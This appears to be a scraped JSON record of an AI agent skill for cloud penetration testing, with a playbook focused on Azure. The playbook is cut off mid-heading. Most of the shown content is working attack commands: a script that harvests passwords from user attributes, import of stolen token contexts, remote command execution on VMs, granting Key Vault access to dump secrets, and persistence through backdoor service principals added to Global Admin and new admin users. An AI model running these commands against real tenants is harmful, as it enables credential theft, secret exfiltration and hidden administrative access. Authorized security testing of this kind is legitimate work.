{
  "id": "antigravity-cloud-penetration-testing",
  "name": "Cloud Penetration Testing",
  "slug": "cloud-penetration-testing",
  "description": "This skill should be used when the user asks to \"perform cloud penetration testing\", \"assess Azure or AWS or GCP security\", \"enumerate cloud resources\", \"exploit cloud misconfigurations\", \"test O365 security\", \"extract secrets from cloud environments\", or \"audit cloud infrastructure\". It provides co",
  "category": "Security & Systems",
  "source": "antigravity",
  "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
  "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cloud-penetration-testing",
  "content": "\n# Cloud Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Azure tools\nInstall-Module -Name Az -AllowClobber -Force\nInstall-Module -Name MSOnline -Force\nInstall-Module -Name AzureAD -Force\n\n# AWS CLI\ncurl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\nunzip awscliv2.zip && sudo ./aws/install\n\n# GCP CLI\ncurl https://sdk.cloud.google.com | bash\ngcloud init\n\n# Additional tools\npip install scoutsuite pacu\n```\n\n### Required Knowledge\n- Cloud architecture fundamentals\n- Identity and Access Management (IAM)\n- API authentication mechanisms\n- DevOps and automation concepts\n\n### Required Access\n- Written authorization for testing\n- Test credentials or access tokens\n- Defined scope and rules of engagement\n\n## Outputs and Deliverables\n\n1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings\n2. **Resource Inventory** - Enumerated services, storage, and compute instances\n3. **Credential Findings** - Exposed secrets, keys, and misconfigurations\n4. **Remediation Recommendations** - Hardening guidance per platform\n\n## Core Workflow\n\n### Phase 1: Reconnaissance\n\nGather initial information about target cloud presence:\n\n```bash\n# Azure: Get federation info\ncurl \"https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1\"\n\n# Azure: Get Tenant ID\ncurl \"https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration\"\n\n# Enumerate cloud resources by company name\npython3 cloud_enum.py -k targetcompany\n\n# Check IP against cloud providers\ncat ips.txt | python3 ip2provider.py\n```\n\n### Phase 2: Azure Authentication\n\nAuthenticate to Azure environments:\n\n```powershell\n# Az PowerShell Module\nImport-Module Az\nConnect-AzAccount\n\n# With credentials (may bypass MFA)\n$credential = Get-Credential\nConnect-AzAccount -Credential $credential\n\n# Import stolen context\nImport-AzContext -Profile 'C:\\Temp\\StolenToken.json'\n\n# Export context for persistence\nSave-AzContext -Path C:\\Temp\\AzureAccessToken.json\n\n# MSOnline Module\nImport-Module MSOnline\nConnect-MsolService\n```\n\n### Phase 3: Azure Enumeration\n\nDiscover Azure resources and permissions:\n\n```powershell\n# List contexts and subscriptions\nGet-AzContext -ListAvailable\nGet-AzSubscription\n\n# Current user role assignments\nGet-AzRoleAssignment\n\n# List resources\nGet-AzResource\nGet-AzResourceGroup\n\n# Storage accounts\nGet-AzStorageAccount\n\n# Web applications\nGet-AzWebApp\n\n# SQL Servers and databases\nGet-AzSQLServer\nGet-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG\n\n# Virtual machines\nGet-AzVM\n$vm = Get-AzVM -Name \"VMName\"\n$vm.OSProfile\n\n# List all users\nGet-MSolUser -All\n\n# List all groups\nGet-MSolGroup -All\n\n# Global Admins\nGet-MsolRole -RoleName \"Company Administrator\"\nGet-MSolGroupMember -GroupObjectId $GUID\n\n# Service Principals\nGet-MsolServicePrincipal\n```\n\n### Phase 4: Azure Exploitation\n\nExploit Azure misconfigurations:\n\n```powershell\n# Search user attributes for passwords\n$users = Get-MsolUser -All\nforeach($user in $users){\n    $props = @()\n    $user | Get-Member | foreach-object{$props+=$_.Name}\n    foreach($prop in $props){\n        if($user.$prop -like \"*password*\"){\n            Write-Output (\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop)\n        }\n    }\n}\n\n# Execute commands on VMs\nInvoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1\n\n# Extract VM UserData\n$vms = Get-AzVM\n$vms.UserData\n\n# Dump Key Vault secrets\naz keyvault list --query '[].name' --output tsv\naz keyvault set-policy --name <vault> --upn <user> --secret-permissions get list\naz keyvault secret list --vault-name <vault> --query '[].id' --output tsv\naz keyvault secret show --id <URI>\n```\n\n### Phase 5: Azure Persistence\n\nEstablish persistence in Azure:\n\n```powershell\n# Create backdoor service principal\n$spn = New-AzAdServicePrincipal -DisplayName \"WebService\" -Role Owner\n$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)\n$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)\n\n# Add service principal to Global Admin\n$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>\n$role = Get-MsolRole -RoleName \"Company Administrator\"\nAdd-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId\n\n# Login as service principal\n$cred = Get-Credential  # AppID as username, secret as password\nConnect-AzAccount -Credential $cred -Tenant \"tenant-id\" -ServicePrincipal\n\n# Create new admin user via CLI\naz ad user create --display-name <name> --password <pass> --user-principal-name <upn>\n```\n\n###",
  "tags": [
    "python",
    "api",
    "ai",
    "automation",
    "workflow",
    "document",
    "security",
    "kubernetes",
    "aws",
    "gcp"
  ],
  "useCases": [],
  "scrapedAt": "2026-01-26T13:17:36.495Z"
}